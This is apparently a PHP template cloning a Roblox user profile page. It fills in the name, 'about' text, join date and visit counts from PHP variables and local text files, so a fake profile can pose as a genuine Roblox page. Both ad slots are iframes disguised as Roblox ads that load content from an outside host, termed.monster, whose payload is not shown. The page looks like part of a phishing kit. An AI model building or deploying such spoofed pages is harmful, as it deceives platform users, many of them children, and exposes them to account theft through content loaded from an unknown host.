                                            </ul>
                </div>
            
            <script type="text/javascript">
                $(function() {
                    $(".details-actions, .mobile-details-actions").on("click", ".profile-join-game", function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        // NOTE: global var set due to legacy game launch code.
                        play_placeId = 0;
                        try {
                            ;
                            var referrerId = Roblox.UrlParser ? Roblox.UrlParser.getParameterValueByName("rbxp") : null;
                            if (Roblox.GamePlayEvents) {
                                var context = Roblox.GamePlayEvents.contextCategories.joinUser;
                                Roblox.GamePlayEvents.SendGamePlayIntent(context, play_placeId, referrerId);
                            }
                        }
                        catch (e) {
                            if (GoogleAnalyticsEvents && GoogleAnalyticsEvents.FireEvent) {
                                GoogleAnalyticsEvents.FireEvent(["Protocol", "Launch Failure", "follow", 0]);
                            }
                            
                        }
                        return false;
                    });
                });
            </script>
        </div>

        <captcha activated="captcha.activated" captcha-action-type="captcha.actionTypes.followUser" captcha-failed="followUserCaptchaFailed" captcha-passed="followUserCaptchaPassed" input-params="captcha.inputParams" return-token-in-success-cb="true" class="ng-isolate-scope"><div class="captcha-container ng-scope" ng-controller="captchaV2Controller"> <div class="modal" ng-class="$ctrl.getCaptchaClasses()" ng-click="$ctrl.hideCaptcha()"> <div class="modal-dialog"> <div class="modal-content"> <div class="modal-body" ng-click="$event.stopPropagation()"> <button type="button" class="close" ng-click="$ctrl.hideCaptcha()"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button> <div id="captchaV2-1" class="captchav2-funcaptcha-modal-body"></div> </div> </div> </div> </div> </div></captcha>

    </div><!--profile-header-content-->
</div><!-- profile-header -->

        <!-- ngInclude: 'system-feedback' --><div ng-include="'system-feedback'" class="ng-scope"><div class="alert-system-feedback ng-scope"><div class="alert alert-warning"></div></div></div>
        <div class="rbx-tabs-horizontal">
            <ul id="horizontal-tabs" class="nav nav-tabs" role="tablist" profile-tab-click="">
                <li class="rbx-tab active">
                    <a class="rbx-tab-heading" href="#about" id="tab-about">
                        <span class="text-lead">About</span>
                        <span class="rbx-tab-subtitle"></span>
                    </a>
                </li>
                <li class="rbx-tab">
                    <a class="rbx-tab-heading" href="#creations" id="tab-creations">
                        <span class="text-lead">Creations</span>
                        <span class="rbx-tab-subtitle"></span>
                    </a>
                </li>
            </ul>
            <div class="tab-content rbx-tab-content">
                <div class="tab-pane active" id="about">
                    <div class="section profile-about ng-scope" ng-controller="profileUtilitiesController">

        <div class="container-header">
            <h3>About</h3>
        </div>
        <div class="section-content remove-panel">
                <!--Default profile about section with status intact, remove ! to hide-->
                <div class="profile-about-content toggle-target">
                    <!--Use ng-show here so the Read More binding callback can work (Reference/widget.js)-->
                    <pre id="profile-about-text" class="text profile-about-text">                    <span class="profile-about-content-text linkify" ng-non-bindable=""><?=$aboutme?></span>
                </pre>
                    <span class="toggle-content text-link cursor-pointer" data-container-id="profile-about-text" data-show-label="Read More" data-hide-label="Show Less" style="display: none;">Read More</span>
                </div>
        </div>

    <div class="section-content remove-panel">
        <div id="aliases-container">
            <div class="border-top ng-hide" ng-hide="isAliasesLoaded">
                <span class="spinner spinner-default"></span>
            </div>
            <div aliases-container=""><div class="border-top ng-scope ng-hide" ng-controller="aliasesContainerController" ng-show="layout.isAliasesShown"> <div class="user-tag-header"> <span class="font-header-2 ng-binding" ng-bind="layout.label">Alias</span> <button class="btn-generic-edit-sm" ng-click="changeAlias()"> <span class="icon-edit"></span> </button> </div> <div class="font-header-2 text-subheader user-tag ng-binding" ng-bind="library.currentUserTag"></div> </div></div>
        </div>
        <div class="border-top profile-about-footer">

                <a href="https://www.roblox.com/abusereport/UserProfile?id=3524148282&amp;redirectUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F3524148282%2Fprofile" class="abuse-report-link abuse-report-modal">
                    <span class="text-error ng-binding" ng-bind="'Label.ReportAbuse' | translate">Report Abuse</span>
                </a>

        </div>
    </div>
</div>

<div id="profile-current-wearing-avatar" class="section profile-avatar"><div class="container-header"><h3>Currently Wearing</h3></div><div class="col-sm-6 section-content profile-avatar-left"><div class="thumbnail-holder"><span class="thumbnail-2d-container thumbnail-span"><img class="" src="<?=$thumbnail?>" alt="" title=""></span><button type="button" class="enable-three-dee btn-control btn-control-lg btn--width">3D</button></div></div><div class="col-sm-6 section-content profile-avatar-right"><div class="profile-avatar-mask"><div class="profile-accoutrements-container"><div class="profile-accoutrements-slider"></div><div class="profile-accoutrements-page-container"><span class="profile-accoutrements-page page-active"></span></div></div></div></div></div>

<div class="section home-friends"> <div class="container-header people-list-header"> <h3 class="ng-binding"> Friends<span ng-show="library.numOfFriends !== null" class="friends-count ng-binding"></span> </h3> <span ng-show="layout.invalidPresenceData" class="presence-error ng-hide"> <span class="icon-warning"></span> <span class="text-error ng-binding" ng-bind="'Label.PresenceError' | translate">User status may not be up to date</span> </span> <a href="https://www.roblox.com/users/1435405314/friends" class="btn-secondary-xs btn-more see-all-link-icon ng-binding">See All</a> </div> <div class="section-content remove-panel people-list"><p ng-show="layout.friendsError" class="section-content-off ng-binding ng-hide" ng-bind="'Label.FriendsError' | translate">Unable to load friends</p><ul class="hlist" ng-controller="friendsListController" people-list="" ng-class="{'invisible': !layout.isAllFriendsDataLoaded}"></ul><span class="spinner spinner-default ng-hide" ng-show="!layout.isAllFriendsDataLoaded"></span> </div> </div>
    <div class="section layer profile-collections ng-scope" ng-controller="profileCollectionsController">
        <div class="container-header">
            <h3 ng-bind="'Heading.Collections' | translate" class="ng-binding">Collections</h3>
            <div class="collection-btns">
                    <a href="https://www.roblox.com/users/3524148282/inventory/" class="btn-min-width btn-secondary-xs btn-more inventory-link see-all-link-icon ng-binding" ng-bind="'Action.Inventory' | translate">Inventory</a>
                            </div>
        </div>
            <!-- ngInclude: 'profile-collections-section' --><div class="section-content remove-panel ng-scope" ng-include="'profile-collections-section'"><ul class="hlist collections-list item-list ng-scope" ng-init="getCollectionsData()"><?=requestCollections($userid)?></ul></div>

    </div>

<div groups-showcase="" display-user-id="3524148282" class="ng-isolate-scope"><!-- ngIf: !metadata.areProfileGroupsHidden --><div ng-if="!metadata.areProfileGroupsHidden" ng-class="{'section': !layout.isGridOn, 'container-list': layout.isGridOn}" ng-show="groups.length > 0" class="ng-scope ng-hide section"> <div class="container-header"> <h3 ng-bind="'Heading.Groups' | translate" class="ng-binding">Groups</h3> <div class="container-buttons"> <button class="profile-view-selector btn-secondary-xs btn-generic-slideshow-xs" title="Slideshow View" type="button" ng-click="updateDisplay(false)" ng-class="{'btn-secondary-xs btn-generic-slideshow-xs': !layout.isGridOn, 'btn-control-xs btn-generic-slideshow-xs': layout.isGridOn}"> <span class="icon-slideshow selected" ng-class="{'selected': !layout.isGridOn}"></span> </button> <button class="profile-view-selector btn-control-xs btn-generic-grid-xs" title="Grid View" type="button" ng-click="updateDisplay(true)" ng-class="{'btn-secondary-xs btn-generic-grid-xs': layout.isGridOn, 'btn-control-xs btn-generic-grid-xs': !layout.isGridOn}"> <span class="icon-grid" ng-class="{'selected': layout.isGridOn}"></span> </button> </div> </div> <div class="profile-slide-container section-content remove-panel"> <groups-showcase-grid groups-cache="groups" ng-show="layout.isGridOn" class="ng-isolate-scope ng-hide"><ul class="hlist game-cards group-list" horizontal-scroll-bar="$ctrl.loadMoreGroups()"> <!-- ngRepeat: group in $ctrl.groups --> </ul> <a ng-click="$ctrl.loadMoreGroups()" class="btn btn-control-xs load-more-button ng-binding ng-hide" ng-bind="'Label.LoadMore' | translate" ng-show="$ctrl.layout.canLoadMore">Load More</a></groups-showcase-grid> <div id="groups-switcher" class="switcher slide-switcher groups ng-isolate-scope" groups-showcase-switcher="" groups="groups" ng-hide="layout.isGridOn"><ul class="slide-items-container switcher-items hlist"> <!-- ngRepeat: group in groups --> </ul> <!-- ngIf: multipleItems() --> <!-- ngIf: multipleItems() --></div> </div> </div><!-- end ngIf: !metadata.areProfileGroupsHidden --></div>




    <div class="section" id="roblox-badges-container"></div>

    <div class="section" id="roblox-badges-container"><div class="container-header"><h3>Roblox Badges</h3></div><div class="section-content remove-panel"><ul class="hlist badge-list"><li class="list-item asset-item"><a class="" href="https://www.roblox.com/info/roblox-badges#Badge2" title="This badge is given to members who have embraced the Roblox community and have made at least 20 friends. People who have this badge are good people to know and can probably help you out if you are having trouble."><span class="border asset-thumb-container icon-badge-friendship" title="Friendship"></span><span class="font-header-2 text-overflow item-name">Friendship</span></a></li><li class="list-item asset-item"><a class="" href="https://www.roblox.com/info/roblox-badges#Badge12" title="This badge recognizes members who have visited Roblox for one year or more. They are stalwart community members who have stuck with us over countless releases, and have helped shape Roblox into the experience that it is today. These medalists are the true steel, the core of the Robloxian history ... and its future."><span class="border asset-thumb-container icon-badge-veteran" title="Veteran"></span><span class="font-header-2 text-overflow item-name">Veteran</span></a></li></ul></div></div>

<div class="section profile-statistics"><div class="container-header"><h3>Statistics</h3></div><div class="section-content"><ul class="profile-stats-container"><li class="profile-stat"><p class="text-label">Join Date</p><p class="text-lead"><?=htmlspecialchars(file_get_contents('controller/joindate.txt'))?></p></li><li class="profile-stat"><p class="text-label">Place Visits</p><p class="text-lead"><?=number_format(htmlspecialchars(file_get_contents('controller/placevisits.txt')))?></p></li></ul></div></div>

                </div>
                <div class="tab-pane" id="creations" profile-empty-tab="">
                    
    <div class="profile-game ng-scope section" ng-controller="profileGridController" ng-init="init('game-cards','game-container')" ng-class="{'section': !isGridOn,
                    'container-list': isGridOn}">
        <div class="container-header">
            <h3 ng-non-bindable="">Experiences</h3>
            <div class="container-buttons">
                <button class="profile-view-selector btn-secondary-xs btn-generic-slideshow-xs" title="Slideshow View" type="button" ng-click="updateDisplay(false)" ng-class="{'btn-secondary-xs btn-generic-slideshow-xs': !isGridOn, 'btn-control-xs btn-generic-slideshow-xs': isGridOn}">
                    <span class="icon-slideshow selected" ng-class="{'selected': !isGridOn}"></span>
                </button>
                <button class="profile-view-selector btn-control-xs btn-generic-grid-xs" title="Grid View" type="button" ng-click="updateDisplay(true)" ng-class="{'btn-secondary-xs btn-generic-grid-xs': isGridOn, 'btn-control-xs btn-generic-grid-xs': !isGridOn}">
                    <span class="icon-grid" ng-class="{'selected': isGridOn}"></span>
                </button>
            </div>
        </div>
        <div ng-show="isGridOn" class="game-grid ng-hide">
            <ul class="hlist game-cards" style="max-height: -8px" horizontal-scroll-bar="loadMore()">
                        <div class="game-container shown" data-index="0" ng-class="{'shown': 0 < visibleItems}">


<li class="list-item game-card game-tile">
    <div class="game-card-container">
        <a href="https://www.roblox.com/games/refer?PlaceId=9547174514&amp;Position=1&amp;PageType=Profile" class="game-card-link">
            <div class="game-card-thumb-container">
                    <img class="game-card-thumb ng-isolate-scope" data-="" src="https://t7.rbxcdn.com/3d488fd0c90913dfec460bfe37a24ae0" alt="<?=$fusername?>'s Place" thumbnail="{&quot;Final&quot;:true,&quot;Url&quot;:&quot;https://t7.rbxcdn.com/3d488fd0c90913dfec460bfe37a24ae0&quot;,&quot;RetryUrl&quot;:null,&quot;UserId&quot;:0,&quot;EndpointType&quot;:&quot;Avatar&quot;}" image-retry="">
            </div>
            <div class="game-card-name game-name-title" title="<?=$fusername?>'s Place" ng-non-bindable="">
                <?=$fusername?>'s Place
            </div>
            <div class="game-card-info">
                    <span class="info-label icon-votes-gray"></span>
                    <span class="info-label vote-percentage-label hidden">0%</span>
                    <span class="info-label no-vote "></span>
                    <span class="info-label icon-playing-counts-gray"></span>
                    <span class="info-label playing-counts-label" title="0">0</span>
            </div>
        </a>
    </div>
</li>

                        </div>

            </ul>
            <a ng-click="loadMore()" class="btn btn-control-xs load-more-button ng-hide" ng-show="1 > 6 * NumberOfVisibleRows">Load More</a>
        </div>
        <div id="games-switcher" class="switcher slide-switcher games ng-isolate-scope" ng-hide="isGridOn" switcher="" itemscount="switcher.games.itemsCount" currpage="switcher.games.currPage">
                        <ul class="slide-items-container switcher-items hlist">
                    <li class="switcher-item slide-item-container active" ng-class="{'active': switcher.games.currPage == 0}" data-index="0">
                        <div class="col-sm-6 slide-item-container-left">
                            <div class="slide-item-emblem-container">
                                <a href="https://www.roblox.com/games/refer?PlaceId=9547174514&amp;Position=1&amp;PageType=Profile">
                            <img class="slide-item-image ng-isolate-scope" src="https://t7.rbxcdn.com/3d488fd0c90913dfec460bfe37a24ae0" data-src="https://t7.rbxcdn.com/3d488fd0c90913dfec460bfe37a24ae0" data-emblem-id="9547174514" thumbnail="{&quot;Final&quot;:true,&quot;Url&quot;:&quot;https://t7.rbxcdn.com/3d488fd0c90913dfec460bfe37a24ae0&quot;,&quot;RetryUrl&quot;:null,&quot;UserId&quot;:0,&quot;EndpointType&quot;:&quot;Avatar&quot;}" image-retry="">

                                </a>
                            </div>
                        </div>
                        <div class="col-sm-6 slide-item-container-right games">
                            <div class="slide-item-info">
                                <div class="text-overflow slide-item-name games font-title" ng-non-bindable=""><?=$fusername?>'s Place</div>
                                <p class="text-description para-overflow slide-item-description games" ng-non-bindable="">This is your very first Roblox creation. Check it out, then make it your own with Roblox Studio!</p>
                            </div>                            
                            <div class="slide-item-stats">
                                <ul class="hlist">
                                    <li class="list-item">
                                        <!-- ngIf: appMeta.isI18nEnabled --><div class="text-label slide-item-stat-title ng-binding ng-scope" ng-if="appMeta.isI18nEnabled" ng-bind="'Label.Playing' | translate">Active</div><!-- end ngIf: appMeta.isI18nEnabled -->
                                        <!-- ngIf: !appMeta.isI18nEnabled -->
                                        <div class="text-lead slide-item-members-count">0</div>
                                    </li>
                                    <li class="list-item">
                                        <!-- ngIf: appMeta.isI18nEnabled --><div class="text-label slide-item-stat-title ng-binding ng-scope" ng-if="appMeta.isI18nEnabled" ng-bind="'Label.Visits' | translate">Visits</div><!-- end ngIf: appMeta.isI18nEnabled -->
                                        <!-- ngIf: !appMeta.isI18nEnabled -->
                                        <div class="text-lead text-overflow slide-item-my-rank games"><?=number_format(htmlspecialchars(file_get_contents('controller/placevisits.txt')))?></div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </li>
                        </ul>


        </div>
    </div>


    <div class="section ng-scope" ng-controller="profileUtilitiesController" ng-init="getPlayerAssets('10')">
        <!-- ngIf: assets.length > 0 -->
    </div>
    <div class="section ng-scope" ng-controller="profileUtilitiesController" ng-init="getPlayerAssets('11')">
        <!-- ngIf: assets.length > 0 -->
    </div>


                    <!-- ngIf: profileLayout.userHasNoCreations -->
                </div>
            </div>
        </div>
    </div>
</div>
<div>
    <div class="profile-ads-container">
        <div id="ProfilePageAdDiv1" class="profile-ad"><iframe name="Roblox_GameDetail_Top_728x90" 
                    allowtransparency="true"
                    frameborder="0"
                    height="250"
                    scrolling="no"
                    data-src=""
                    src="http://termed.monster/spon.php?id=3"
                    width="300"
                    data-js-adtype="iframead"
                    data-ad-slot="Roblox_GameDetail_Top_728x90"></iframe></div>
        <div id="ProfilePageAdDiv2" class="profile-ad"><iframe name="Roblox_GameDetail_Top_728x90" 
                    allowtransparency="true"
                    frameborder="0"
                    height="250"
                    scrolling="no"
                    data-src=""
                    src="http://termed.monster/spon.php?id=3"
                    width="300"
                    data-js-adtype="iframead"
                    data-ad-slot="Roblox_GameDetail_Top_728x90"></iframe></div>
    </div>
</div>


        </div>
            </div> 
<!--Bootstrap Footer React Component -->

<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a class="text-footer-nav" href="/info/about-us?locale=en_us" target="_blank">About Us</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/jobs?locale=en_us" target="_blank">Jobs</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/blog?locale=en_us" target="_blank">Blog</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/parents?locale=en_us" target="_blank">Parents</a></li><li class="footer-link"><a class="text-footer-nav giftcards" href="/giftcards?locale=en_us" target="_blank">Gift Cards</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/help?locale=en_us" target="_blank">Help</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/terms?locale=en_us" target="_blank">Terms</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/accessibility?locale=en_us" target="_blank">Accessibility</a></li><li class="footer-link"><a class="text-footer-nav privacy" href="/info/privacy?locale=en_us" target="_blank">Privacy</a></li><li></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p></div></div></div></footer></div> 

<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>


    <script type="text/javascript">function urchinTracker() {}</script>


<script type="text/javascript">
    if (typeof Roblox === "undefined") {
        Roblox = {};
    }
    if (typeof Roblox.PlaceLauncher === "undefined") {
        Roblox.PlaceLauncher = {};
    }
    var isRobloxIconEnabledForRetheme = "True";
    var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>";
    Roblox.PlaceLauncher.Resources = {
        RefactorEnabled: "True",
        IsProtocolHandlerBaseUrlParamEnabled: "False",
        ProtocolHandlerAreYouInstalled: {
            play: {
                content: robloxIcon + "<p>You&#39;re moments away from getting into the experience!</p>",
                buttonText: "Download and Install Roblox",
                footerContent: "<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >Click here for help</a> "
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Get started creating your own experiences!</p>",
                buttonText: "Download Studio"
            }
        },
        ProtocolHandlerStartingDialog: {
            play: {
                content: robloxIcon + "<p>Roblox is now loading. Get ready!</p>"
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Checking for Roblox Studio...</p>"
            },
            loader: "<span class='spinner spinner-default'></span>"
        }
    };
</script>
<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">
    <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
        <div id="Spinner" class="Spinner" style="padding:20px 0;">
            <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced">
        </div>
        <div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
            <div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">
                Starting Roblox...
            </div>
            <div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
            <div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
        </div>
        <div style="text-align:center;margin-top:1em">
            <input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel">
        </div>
    </div>
</div>
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">
    <p class="larger-font-size">
        <span class="icon-moreinfo"></span>
                
                    Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future!
                
    </p>
</div>

<script type="text/javascript">
function checkRobloxInstall() {
         return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
}
</script>


    <div id="InstallationInstructions" class="" style="display:none;">
        <div class="ph-installinstructions">
            <div class="ph-modal-header">
                    <span class="icon-close simplemodal-close"></span>
                    <h3 class="title">Thanks for visiting Roblox</h3>
            </div>
            <div class="modal-content-container"> 
                <div class="ph-installinstructions-body ">


        <ul class="modal-col-4">
            <li class="step1-of-4">
                <h2>1</h2>
                <p class="larger-font-size">Click <strong>RobloxPlayer.exe</strong> to run the Roblox installer, which just downloaded via your web browser.</p>
                <img data-delaysrc="https://images.rbxcdn.com/28eaa93b899b93461399aebf21c5346f.png" src="https://images.rbxcdn.com/28eaa93b899b93461399aebf21c5346f.png" class="src-replaced">
            </li>
            <li class="step2-of-4">
                <h2>2</h2>
                <p class="larger-font-size">Click <strong>Run</strong> when prompted by your computer to begin the installation process.</p>
                <img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" src="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" class="src-replaced">
            </li>
            <li class="step3-of-4">
                <h2>3</h2>
                <p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p>
                <img data-delaysrc="https://images.rbxcdn.com/3797745629baca2d1b9496b76bc9e6dc.png" src="https://images.rbxcdn.com/3797745629baca2d1b9496b76bc9e6dc.png" class="src-replaced">
            </li>
            <li class="step4-of-4">
                <h2>4</h2>
                <p class="larger-font-size">After installation, click <strong>Join</strong> below to join the action!</p>
                <div class="VisitButton VisitButtonContinueGLI">
                    <a class="btn btn-primary-lg disabled btn-full-width">Join</a>
                </div>
            </li>
        </ul>

                </div>
            </div>
            <div class="xsmall">
                The Roblox installer should download shortly. If it doesn’t, start the <a id="GameLaunchManualInstallLink" href="#" class="text-link">download now.</a>
            </div>
        </div>
    </div>
    <div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;"></div>


<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>

<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="clientinstaller" type="text/javascript" src="https://js.rbxcdn.com/f424a786e3d883cff747a034605fa09d.js"></script>

<script type="text/javascript">
    Roblox.Client._skip = null;
    Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
    Roblox.Client._installHost = 'setup.roblox.com';
    Roblox.Client.ImplementsProxy = true;
    Roblox.Client._silentModeEnabled = true;
    Roblox.Client._bringAppToFrontEnabled = false;
    Roblox.Client._currentPluginVersion = '';
    Roblox.Client._eventStreamLoggingEnabled = true;

        
        Roblox.Client._installSuccess = function() {
            if(GoogleAnalyticsEvents){
                GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
                GoogleAnalyticsEvents.FireEvent(['Plugin','Install Success']);
                if (Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
                    Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
                }
            }
        }
        
            
        if ((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
            window.location.hash = '';
            var continuation = '(' + $.cookie('chromeInstall') + ')';
            play_placeId = $.cookie('chromeInstallPlaceId');
            Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
            $.cookie('chromeInstallPlaceId', null);
            $.cookie('chromeInstallLaunchMode', null);
            $.cookie('chromeInstall', null);
            RobloxLaunch._GoogleAnalyticsCallback = function() { var isInsideRobloxIDE = 'website'; if (Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) { isInsideRobloxIDE = 'Studio'; };GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);EventTracker.fireEvent('GameLaunchAttempt_Win32', 'GameLaunchAttempt_Win32_Plugin'); if (typeof Roblox.GamePlayEvents != 'undefined') { Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId); }  }; 
            Roblox.Client.ResumeTimer(eval(continuation));
        }
        
</script>


<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">
    <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
    <div class="Title"></div>
    <div class="GenericModalBody">
        <div class="TopBody">
            <div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">
                <img class="GenericModalImage" alt="generic image">
            </div>
            <div class="Message"></div>
        </div>
        <div class="ConfirmationModalButtonContainer GenericModalButtonContainer">
            <a href="" id="roblox-confirm-btn"><span></span></a>
            <a href="" id="roblox-decline-btn"><span></span></a>
        </div>
        <div class="ConfirmationModalFooter">
        
        </div>  
    </div>  
    <script type="text/javascript">
        Roblox = Roblox || {};
        Roblox.Resources = Roblox.Resources || {};
        
        Roblox.Resources.GenericConfirmation = {
            yes: "Yes",
            No: "No",
            Confirm: "Confirm",
            Cancel: "Cancel"
        };
    </script>
</div>

<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
    <div id="modal-dialog" class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">
                    <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
                </button>
                <h5 class="modal-title"></h5>
            </div>

            <div class="modal-body">
                <div class="modal-top-body">
                    <div class="modal-message"></div>
                    <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">
                        <img class="modal-thumb" alt="generic image">
                    </div>
                    <div class="modal-checkbox checkbox">
                        <input id="modal-checkbox-input" type="checkbox">
                        <label for="modal-checkbox-input"></label>
                    </div>
                </div>
                <div class="modal-btns">
                    <a href="" id="confirm-btn"><span></span></a>
                    <a href="" id="decline-btn"><span></span></a>
                </div>
                <div class="loading modal-processing">
                    <img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">
                </div>
            </div>
            <div class="modal-footer text-footer">

            </div>
        </div>
    </div>
</div>




<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.jsConsoleEnabled = false;
</script>



    <script type="text/javascript">
        $(function () {
            Roblox.CookieUpgrader.domain = 'roblox.com';
            Roblox.CookieUpgrader.upgrade("GuestData", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });
            Roblox.CookieUpgrader.upgrade("RBXSource", { expires: function (cookie) { return Roblox.CookieUpgrader.getExpirationFromCookieValue("rbx_acquisition_time", cookie); } });
            Roblox.CookieUpgrader.upgrade("RBXViralAcquisition", { expires: function (cookie) { return Roblox.CookieUpgrader.getExpirationFromCookieValue("time", cookie); } });
                
                Roblox.CookieUpgrader.upgrade("RBXMarketing", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });
                
                            
                Roblox.CookieUpgrader.upgrade("RBXSessionTracker", { expires: Roblox.CookieUpgrader.fourHoursFromNow });
                
                            
                Roblox.CookieUpgrader.upgrade("RBXEventTrackerV2", {expires: Roblox.CookieUpgrader.thirtyYearsFromNow});
                
        });
    </script>



    

    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="intl-polyfill" type="text/javascript" src="https://js.rbxcdn.com/d44520f7da5ec476cfb1704d91bab327.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalCore" data-bundle-source="Main" src="https://js.rbxcdn.com/95044be3ff42e3dc429313faca1316cea62f328a39e29689ffeda9002f3a8bc6.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="TranslationResources" data-bundle-source="Main" src="https://js.rbxcdn.com/83d836a661ff433d5b7ce719c489e43af590ff75ab39ccc6d393546fe91b766a.js"></script>


    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="leanbase" type="text/javascript" src="https://js.rbxcdn.com/19c8160ae932a35d164b48dd597c55c2.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/19c5160cfc4b99dcd04154448ce88f9309b48ebf6a57abb848b094c654db7bf1.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/76a4480b37d00df868cd2f72f045e279ab6525b49284e5486c28fd2c3fb8f562.js"></script>



    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="React" data-bundle-source="Main" src="https://js.rbxcdn.com/4c9a00164d9242bd60de5451a22f502c0c221a896d3a555470c03712d5ee4aa1.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js"></script>

